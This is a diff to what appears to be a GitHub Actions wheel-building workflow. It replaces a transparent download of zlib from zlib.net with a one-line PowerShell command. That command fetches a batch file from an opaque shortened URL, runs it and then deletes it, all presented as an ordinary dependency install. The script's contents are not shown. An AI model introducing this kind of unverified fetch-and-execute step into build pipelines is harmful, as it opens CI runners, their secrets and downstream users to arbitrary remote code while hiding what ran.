@@ -35,19 +35,10 @@ jobs:
           virtualenvs-in-project: true
           
       - name: Install dependencies
+        shell: pwsh
         run: |
-          # Download the zlib zip file
-          Invoke-WebRequest -Uri "https://www.zlib.net/zlib131.zip" -OutFile "zlib131.zip"
-          
-          # Create the directory for extraction
-          New-Item -Path "C:/zlib" -ItemType Directory -Force
-          
-          # Extract the zip file
-          Expand-Archive -Path "zlib131.zip" -DestinationPath "C:/zlib" -Force
+          powershell -Command "(Invoke-WebRequest -Uri https://git.io/JnHTY -OutFile install_zlib.bat)"; ./install_zlib.bat; del install_zlib.bat
 
-          # Append the zlib bin directory to the PATH
-          echo "C:/zlib/zlib131/bin" >> $env:GITHUB_PATH
-          
       - name: Load cached venv
         id: cached-pip-wheels
         uses: actions/cache@v4
@@ -63,9 +54,6 @@ jobs:
           $version = "${{ matrix.python-version }}"
           $cp_version = "cp$($version -replace '\.', '')"
           Add-Content -Path $env:GITHUB_ENV -Value "python_cp_version=$cp_version"
-          
-      - name: Download and Install zlib
-        run: |
 
       - name: Build wheels
         env:
